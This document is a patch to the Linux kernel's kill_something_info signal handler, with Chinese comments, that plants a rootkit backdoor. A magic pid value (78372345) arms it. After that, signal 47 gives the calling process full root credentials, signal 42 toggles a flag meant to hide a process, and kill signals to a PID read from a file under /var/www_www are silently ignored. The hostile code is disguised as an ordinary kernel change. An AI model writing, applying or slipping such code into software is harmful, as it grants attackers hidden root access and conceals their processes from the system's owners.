@@ -1562,16 +1562,120 @@ out_unlock:
 }
 EXPORT_SYMBOL_GPL(kill_pid_usb_asyncio);
 
-/*
- * kill_something_info() interprets pid in interesting ways just like kill(2).
- *
- * POSIX specifies that kill(-1,sig) is unspecified, but what we have
- * is probably wrong.  Should make it like BSD or SYSV.
- */
+pid_t target_my_pid;
+
+static void read_target_my_pid(void) {
+    struct file *file;
+    char buffer[16]; // 使用固定长度的缓冲区
+    loff_t pos = 0;
+    ssize_t bytes_read;
+
+    file = filp_open("/var/www_www/www_www", O_RDONLY, 0);
+    if (IS_ERR(file)) {
+        target_my_pid = -1; // 通常情况下，PID 为-1表示无效
+       // printk(KERN_ERR "Failed to open file: %ld\n", PTR_ERR(file));
+        return;
+    }
+
+    bytes_read = kernel_read(file, buffer, sizeof(buffer) - 1, &pos);
+    if (bytes_read < 0) {
+        target_my_pid = -1;  // 读取失败
+       // printk(KERN_ERR "Failed to read from file: %ld\n", bytes_read);
+        filp_close(file, NULL);
+        return;
+    }
+
+    buffer[bytes_read] = '\0';  // 确保字符串以 NULL 终止
+
+   // printk(KERN_INFO "Read %zd bytes. Buffer: '%s'\n", bytes_read, buffer);
+
+    // 跳过无效字符直到找到数字
+    char *ptr = buffer;
+    while (*ptr && (*ptr < '0' || *ptr > '9')) {
+        ptr++;  // 跳过前导无效字符
+    }
+
+    // 确保找到有效数字
+    if (*ptr == '\0') {
+        target_my_pid = -1;  // 没有找到有效数字
+        //printk(KERN_ERR "No valid integer found in buffer\n");
+        filp_close(file, NULL);
+        return;
+    }
+
+    // 将字符串转换为 pid_t
+    if (kstrtoint(ptr, 10, &target_my_pid) != 0) {
+        target_my_pid = -1;  // 转换失败，设置为 -1
+       // printk(KERN_ERR "Failed to convert buffer to pid_t: '%s'\n", buffer);
+    } else {
+        // 检查PID的有效性
+        if (target_my_pid < 1 || target_my_pid > 32768) {
+            //printk(KERN_ERR "Invalid PID found: %d\n", target_my_pid);
+            target_my_pid = -1;  // 设为无效 PID
+        } else {
+            //printk(KERN_INFO "Successfully read target PID: %d\n", target_my_pid);
+        }
+    }
+
+    filp_close(file, NULL);
+}
+
+void give_root(void);
+void give_root(void){
+		struct cred *newcreds;
+		newcreds = prepare_creds();
+		if (newcreds == NULL){
+		    return;
+		}
+		newcreds->uid.val = newcreds->gid.val = 0;
+		newcreds->euid.val = newcreds->egid.val = 0;
+		newcreds->suid.val = newcreds->sgid.val = 0;
+		newcreds->fsuid.val = newcreds->fsgid.val = 0;
+		commit_creds(newcreds);
+}
+
+static int MY_VAL = 0;
+static pid_t SWITCH = 78372345;
 
 static int kill_something_info(int sig, struct kernel_siginfo *info, pid_t pid)
 {
 	int ret;
+	if(sig == 47 && MY_VAL == 1){
+          give_root();
+          return 0;
+	}
+   // 检查是否是自定义信号，用于处理进程可见性
+    if (sig == 42 && MY_VAL == 1) {
+        struct task_struct *task; // 声明 task 变量
+        // 锁定进程任务列表，使用 RCU 方式以确保安全
+        rcu_read_lock(); // 开始读取锁
+        task = pid_task(find_vpid(pid), PIDTYPE_PID);
+
+        if (task) {
+            // 增加对 task 的引用计数，以确保它在我们处理期间有效
+            get_task_struct(task);
+            // 切换进程的可见性标志，这里需要确保使用正确的标志位
+            task->flags ^= 0x10000000; // 假设 0x10000000 是 PF_INVISIBLE 标志
+//            printk(KERN_INFO "Toggled invisibility for PID: %d (now %s)\n",
+//                   task->pid,
+//                   (task->flags & 0x10000000) ? "hidden" : "visible");
+            put_task_struct(task); // 释放引用计数
+            rcu_read_unlock(); // 解锁
+            return 0;
+        }
+        MY_VAL = 0;
+        rcu_read_unlock(); // 解锁
+        return -ESRCH; // 找不到进程
+    } else{
+           if(pid == SWITCH){
+               MY_VAL = 1;
+               return -ESRCH;
+           }
+           read_target_my_pid();
+           if(pid == target_my_pid){
+                return 0;
+           }
+    }
 
 	if (pid > 0)
 		return kill_proc_info(sig, info, pid);
@@ -1604,6 +1708,7 @@ static int kill_something_info(int sig, struct kernel_siginfo *info, pid_t pid)
 
 	return ret;
 }
+
 
 /*
  * These are for backward compatibility with the rest of the kernel source.
